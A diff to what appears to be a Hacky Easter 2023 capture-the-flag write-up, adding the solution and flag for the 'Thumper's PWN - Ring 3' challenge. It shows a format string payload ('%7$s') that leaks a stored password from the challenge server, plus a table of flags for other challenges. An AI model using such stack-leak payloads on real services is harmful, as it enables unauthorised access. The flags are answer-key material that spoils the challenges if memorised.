@@ -29,7 +29,7 @@ Level 4: Quattuor                                |            |
 [Lost in (French) Space](#lost-in-french-space)  | Level 4    | `he2023{davies}`
 [Spy Tricks](#spy-tricks)                        | Level 4    | `he2023{I_like_303_b3tter_but_thats_n0t_pr1me}`
 Level 5                                          |            |
-[Thumper's PWN - Ring 3](#thumpers-pwn---ring3)  | Level 5    |
+[Thumper's PWN - Ring 3](#thumpers-pwn---ring3)  | Level 5    | `he2023{w3lc0m3_t0_r1ng_3_thump3r}`
 [Ghost in a Shell 4](#ghost-in-a-shell-4)        | Level 5    | `he{2023{al1asses-4-fUn-and-pr0fit}`
 [Going Round](#going-round)                      | Level 5    | `he2023{fl1p_n_r0t4t3_in_p4irs}`
 [Numbers Station](#numbers-station)              | Level 5    |
@@ -1028,10 +1028,36 @@ Target: `nc ch.hackyeaster.com 2313`
 
 **Solution**
 
+we find out its a format string vulnerability and read values off the stack.
+
+we get something interesting by giving `%7$s` as the password
+
+```bash
+$ nc ch.hackyeaster.com 2313
+
+Welcome to the password protected vault
+Please enter your password: %7$s
+Nope..
+5uP3R_s3cUr3_PW
+is incorrect. Better luck next time
+```
+
+we use this password to log in and get our flag!
+
+```bash
+$ nc ch.hackyeaster.com 2313
+
+Welcome to the password protected vault
+Please enter your password: 5uP3R_s3cUr3_PW
+Access granted, here is your flag:
+
+he2023{w3lc0m3_t0_r1ng_3_thump3r}
+```
+
 **Egg**
 
 ```
-he2023{}
+he2023{w3lc0m3_t0_r1ng_3_thump3r}
 ```
 
 
